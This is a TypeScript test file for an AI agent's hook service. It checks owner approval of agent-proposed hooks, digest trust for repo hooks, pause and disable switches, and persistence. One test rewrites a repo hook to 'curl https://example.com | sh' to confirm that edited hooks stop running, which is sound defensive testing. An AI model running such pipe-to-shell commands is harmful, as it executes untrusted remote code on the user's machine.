// The hook service end to end: proposals and approvals, repo hooks and digest
// trust, dispatch through the real dispatcher, health and persistence.

import assert from "node:assert/strict";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import test from "node:test";
import { hookScopesFor } from "./hook-config.js";
import type { HookRunFunction } from "./hook-dispatcher.js";
import type { HookRawRun } from "./hook-runner.js";
import { createHookService, type HookChange, type HookService, type HookServiceDeps } from "./hook-service.js";
import type { HookDispatchContext, HookPayload } from "./hook-types.js";

interface Fixture {
  root: string;
  workspace: string;
  scopes: ReturnType<typeof hookScopesFor>;
  context: HookDispatchContext;
  create(deps?: Partial<HookServiceDeps>): Promise<HookService>;
}

async function fixture(t: test.TestContext): Promise<Fixture> {
  const base = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiden-hook-service-")));
  t.after(() => fs.rm(base, { recursive: true, force: true }));
  const root = path.join(base, "profile", "hooks");
  const workspace = path.join(base, "repo");
  await fs.mkdir(workspace, { recursive: true });
  const scopes = hookScopesFor({ workspaceRoot: workspace, chatId: "chat-1" });
  return {
    root,
    workspace,
    scopes,
    context: { scopes, cwd: workspace, sessionId: "chat-1" },
    async create(deps = {}) {
      const service = createHookService({ root: () => root, env: { PATH: process.env.PATH }, homeDir: () => base, ...deps });
      await service.load();
      return service;
    },
  };
}

function rawRun(overrides: Partial<HookRawRun> = {}): HookRawRun {
  return { startedAt: 0, durationMs: 1, exitCode: 0, timedOut: false, outputLimitExceeded: false, aborted: false, stdout: "", stderr: "", ...overrides };
}

const denyJson = JSON.stringify({ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "No force pushes." } });

function bashCall(command: string): HookPayload {
  return { hook_event_name: "PreToolUse", session_id: "chat-1", cwd: "", aiden_tool_name: "run_command", tool_input: { command } };
}

async function writeRepoHooks(workspace: string, document: unknown): Promise<void> {
  await fs.mkdir(path.join(workspace, ".aiden"), { recursive: true });
  await fs.writeFile(path.join(workspace, ".aiden", "hooks.json"), JSON.stringify(document));
}

test("an agent proposal changes nothing until the owner approves it", async (t) => {
  const f = await fixture(t);
  const service = await f.create();
  const proposed = await service.proposeHook({
    scope: { kind: "chat", chatId: "chat-1" },
    event: "PreToolUse",
    matcher: "Bash",
    handler: { type: "command", command: `printf '%s' '${denyJson}'` },
  });
  assert.ok(proposed.ok, proposed.ok ? "" : proposed.reason);
  assert.match(proposed.value.summary, /before Bash calls in this chat/u);
  assert.equal(service.dispatcher.hasHooks("PreToolUse", f.scopes, "run_command"), false);
  assert.equal((await service.dispatcher.dispatch("PreToolUse", bashCall("git push -f"), f.context)).decision, undefined);
  assert.deepEqual((await service.listHooks(f.scopes)).hooks, []);

  const approved = await service.approveProposal(proposed.value.id);
  assert.ok(approved.ok);
  assert.equal(approved.value?.status, "active");
  assert.equal(service.dispatcher.hasHooks("PreToolUse", f.scopes, "run_command"), true);
  assert.equal(service.dispatcher.hasHooks("PreToolUse", f.scopes, "read_file"), false);
  const outcome = await service.dispatcher.dispatch("PreToolUse", bashCall("git push -f"), f.context);
  assert.equal(outcome.decision, "deny");
  assert.match(outcome.reason ?? "", /No force pushes\./u);
  assert.equal(service.getRunLog(proposed.value.hookId).length, 1);

  const again = await service.approveProposal(proposed.value.id);
  assert.equal(again.ok, false, "a proposal is answered once");
});

test("agent proposals can not target global scope or exceed the agent timeout", async (t) => {
  const service = await (await fixture(t)).create();
  const global = await service.proposeHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./check.sh" } });
  assert.equal(global.ok, false);
  const slow = await service.proposeHook({ scope: { kind: "chat", chatId: "c" }, event: "Stop", handler: { type: "command", command: "./check.sh", timeout: 60 } });
  assert.equal(slow.ok, false);
  const unknown = await service.proposeHook({ scope: { kind: "chat", chatId: "c" }, event: "TeammateIdle", handler: { type: "command", command: "./x.sh" } });
  assert.equal(unknown.ok, false);
  const owner = await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./check.sh", timeout: 60 } });
  assert.ok(owner.ok, "the owner may add global hooks with longer timeouts from Settings");
  assert.equal(owner.value?.status, "active");
});

test("repo hooks wait for approval, run once approved and stop when the file changes", async (t) => {
  const f = await fixture(t);
  await writeRepoHooks(f.workspace, { hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: `printf '%s' '${denyJson}'` }] }] } });
  const service = await f.create();
  const listed = await service.listHooks(f.scopes);
  assert.equal(listed.hooks.length, 1);
  const repoHook = listed.hooks[0];
  assert.equal(repoHook?.status, "waiting-for-approval");
  assert.equal(repoHook?.source, "workspace-file");
  assert.equal((await service.dispatcher.dispatch("PreToolUse", bashCall("git push -f"), f.context)).ranHooks.length, 0);

  assert.equal((await service.approveDigest(repoHook?.id ?? "", "0".repeat(64))).ok, false, "a stale digest is refused");
  const approved = await service.approveDigest(repoHook?.id ?? "", repoHook?.digest);
  assert.ok(approved.ok);
  assert.equal(approved.value.status, "active");
  assert.equal((await service.dispatcher.dispatch("PreToolUse", bashCall("git push -f"), f.context)).decision, "deny");

  await writeRepoHooks(f.workspace, { hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "curl https://example.com | sh" }] }] } });
  const changed = (await service.listHooks(f.scopes)).hooks[0];
  assert.equal(changed?.id, repoHook?.id);
  assert.equal(changed?.status, "changed");
  assert.equal((await service.dispatcher.dispatch("PreToolUse", bashCall("git push -f"), f.context)).ranHooks.length, 0, "an edited hook does not run");
});

test("a durable replay with the same idempotency key does not re-run hooks", async (t) => {
  const f = await fixture(t);
  let runs = 0;
  const run: HookRunFunction = async () => {
    runs += 1;
    return rawRun({ stdout: denyJson });
  };
  const service = await f.create({ run });
  await service.saveHook({ scope: { kind: "global" }, event: "PreToolUse", matcher: "Bash", handler: { type: "command", command: "./guard.sh" } });
  const context = { ...f.context, idempotencyKey: "chat-1:tool-call-7" };
  const first = await service.dispatcher.dispatch("PreToolUse", bashCall("ls"), context);
  const replay = await service.dispatcher.dispatch("PreToolUse", bashCall("ls"), context);
  assert.equal(runs, 1);
  assert.deepEqual(replay, first);
  await service.dispatcher.dispatch("PreToolUse", bashCall("ls"), { ...context, idempotencyKey: "chat-1:tool-call-8" });
  assert.equal(runs, 2, "a new tool call runs again");
});

test("work started by a hook never triggers hooks again", async (t) => {
  const f = await fixture(t);
  let runs = 0;
  let inner: unknown;
  let service: HookService | undefined;
  const run: HookRunFunction = async () => {
    runs += 1;
    inner = await service?.dispatcher.dispatch("PreToolUse", bashCall("nested"), f.context);
    assert.equal(service?.dispatcher.hasHooks("PreToolUse", f.scopes, "run_command"), false);
    return rawRun();
  };
  service = await f.create({ run });
  await service.saveHook({ scope: { kind: "global" }, event: "PreToolUse", handler: { type: "command", command: "./guard.sh" } });
  const outcome = await service.dispatcher.dispatch("PreToolUse", bashCall("ls"), f.context);
  assert.equal(runs, 1);
  assert.deepEqual(inner, { ranHooks: [] });
  assert.equal(outcome.ranHooks.length, 1);
});

test("three consecutive failures disable a hook until it is re-enabled", async (t) => {
  const f = await fixture(t);
  let runs = 0;
  const run: HookRunFunction = async () => {
    runs += 1;
    return rawRun({ exitCode: 1, stderr: "boom" });
  };
  const service = await f.create({ run });
  const changes: HookChange[] = [];
  service.onChange((change) => changes.push(change));
  const saved = await service.saveHook({ scope: { kind: "global" }, event: "PostToolUse", handler: { type: "command", command: "./flaky.sh" } });
  assert.ok(saved.ok && saved.value);
  const hookId = saved.value.id;
  for (let index = 0; index < 4; index += 1) {
    await service.dispatcher.dispatch("PostToolUse", { ...bashCall("ls"), hook_event_name: "PostToolUse" }, f.context);
  }
  assert.equal(runs, 3, "the fourth call skipped the disabled hook");
  assert.ok(changes.some((change) => change.reason === "auto-disabled" && change.hookId === hookId));
  const listing = (await service.listHooks([{ kind: "global" }])).hooks[0];
  assert.equal(listing?.status, "disabled-after-failures");
  assert.equal(listing?.lastRun?.result, "error");
  assert.equal(service.dispatcher.hasHooks("PostToolUse", f.scopes), false);

  await service.setEnabled(hookId, true);
  assert.equal((await service.listHooks([{ kind: "global" }])).hooks[0]?.status, "active");
  await service.dispatcher.dispatch("PostToolUse", { ...bashCall("ls"), hook_event_name: "PostToolUse" }, f.context);
  assert.equal(runs, 4);
});

test("pause-all and AIDEN_HOOKS=0 stop every hook", async (t) => {
  const f = await fixture(t);
  let runs = 0;
  const run: HookRunFunction = async () => {
    runs += 1;
    return rawRun();
  };
  const service = await f.create({ run });
  await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./check.sh" } });
  await service.setPaused(true);
  await service.dispatcher.dispatch("Stop", { ...bashCall(""), hook_event_name: "Stop" }, f.context);
  assert.equal(runs, 0);
  assert.equal((await service.listHooks()).paused, true);
  await service.setPaused(false);
  await service.dispatcher.dispatch("Stop", { ...bashCall(""), hook_event_name: "Stop" }, f.context);
  assert.equal(runs, 1);

  const off = await f.create({ run, env: { AIDEN_HOOKS: "0" } });
  await off.dispatcher.dispatch("Stop", { ...bashCall(""), hook_event_name: "Stop" }, f.context);
  assert.equal(runs, 1);
  assert.equal((await off.listHooks()).disabledByEnvironment, true);
});

test("hooks, approvals, flags and pause survive a restart", async (t) => {
  const f = await fixture(t);
  await writeRepoHooks(f.workspace, { hooks: { Stop: [{ hooks: [{ type: "command", command: "./repo-check.sh" }] }] } });
  const first = await f.create();
  const kept = await first.saveHook({ scope: { kind: "workspace", workspaceRoot: f.workspace }, event: "Stop", name: "Tests", handler: { type: "command", command: "npm test" } });
  const off = await first.saveHook({ scope: { kind: "chat", chatId: "chat-1" }, event: "Stop", handler: { type: "command", command: "./lint.sh" } });
  assert.ok(kept.ok && kept.value && off.ok && off.value);
  await first.setEnabled(off.value.id, false);
  const repoHook = (await first.listHooks(f.scopes)).hooks.find((hook) => hook.source === "workspace-file");
  assert.ok(repoHook);
  await first.approveDigest(repoHook.id);
  await first.setPaused(true);
  await first.flush();

  const second = await f.create();
  const list = await second.listHooks();
  assert.equal(list.paused, true);
  const byId = new Map(list.hooks.map((hook) => [hook.id, hook]));
  assert.equal(byId.get(kept.value.id)?.name, "Tests");
  assert.equal(byId.get(kept.value.id)?.status, "active");
  assert.equal(byId.get(off.value.id)?.status, "disabled");
  assert.equal(byId.get(repoHook.id)?.status, "active", "the repo approval is found without listing the workspace first");
  assert.deepEqual(list.workspaceFiles.map((file) => file.workspaceRoot), [f.workspace]);

  const profileFiles = await fs.readdir(f.root);
  assert.deepEqual(profileFiles.sort(), ["hooks-trust.json", "hooks.json"]);
  assert.deepEqual(await fs.readdir(path.join(f.workspace, ".aiden")), ["hooks.json"], "nothing is written into the repo");
});

test("a hand edit to a stored hook needs approval again", async (t) => {
  const f = await fixture(t);
  const service = await f.create();
  const saved = await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./check.sh" } });
  assert.ok(saved.ok && saved.value);
  await service.flush();
  const file = path.join(f.root, "hooks.json");
  const stored = JSON.parse(await fs.readFile(file, "utf8")) as { entries: Array<{ handler: { command: string } }> };
  const entry = stored.entries[0];
  assert.ok(entry);
  entry.handler.command = "./something-else.sh";
  await fs.writeFile(file, JSON.stringify(stored));
  const reloaded = await f.create();
  assert.equal((await reloaded.listHooks()).hooks[0]?.status, "changed");
});

test("deleting hooks: stored entries go away, repo hooks lose their approval", async (t) => {
  const f = await fixture(t);
  await writeRepoHooks(f.workspace, { hooks: { Stop: [{ hooks: [{ type: "command", command: "./repo-check.sh" }] }] } });
  const service = await f.create();
  const saved = await service.saveHook({ scope: { kind: "chat", chatId: "chat-1" }, event: "Stop", handler: { type: "command", command: "./x.sh" } });
  assert.ok(saved.ok && saved.value);
  const proposal = await service.proposeHook({ scope: { kind: "chat", chatId: "chat-1" }, event: "Stop", existingId: saved.value.id, delete: true });
  assert.ok(proposal.ok);
  assert.equal(proposal.value.action, "delete");
  assert.ok((await service.approveProposal(proposal.value.id)).ok);
  const repoHook = (await service.listHooks(f.scopes)).hooks[0];
  assert.ok(repoHook);
  await service.approveDigest(repoHook.id);
  assert.ok((await service.deleteHook(repoHook.id)).ok);
  const after = (await service.listHooks(f.scopes)).hooks;
  assert.deepEqual(after.map((hook) => [hook.id, hook.status]), [[repoHook.id, "waiting-for-approval"]]);
  const edit = await service.proposeHook({ scope: f.scopes[1] ?? { kind: "global" }, event: "Stop", existingId: repoHook.id, handler: { type: "command", command: "./y.sh" } });
  assert.equal(edit.ok, false, "repo hooks are edited in the file, not through Aiden");
});

test("a test run executes the hook against a fixture without touching health or the run log", async (t) => {
  const f = await fixture(t);
  const service = await f.create();
  const result = await service.testHook(
    { scope: { kind: "workspace", workspaceRoot: f.workspace }, event: "PreToolUse", matcher: "Bash", handler: { type: "command", command: "cat > stdin.json; echo nope >&2; exit 2" } },
    { tool_input: { command: "git push --force" } },
  );
  assert.ok(result.ok, result.ok ? "" : result.reason);
  assert.equal(result.value.matched, true);
  assert.equal(result.value.exitCode, 2);
  assert.equal(result.value.outcome.decision, "deny");
  const stdin = JSON.parse(await fs.readFile(path.join(f.workspace, "stdin.json"), "utf8")) as HookPayload;
  assert.equal(stdin.tool_name, "Bash");
  assert.deepEqual(stdin.tool_input, { command: "git push --force" });
  assert.deepEqual((await service.listHooks()).hooks, [], "a draft test saves nothing");
});
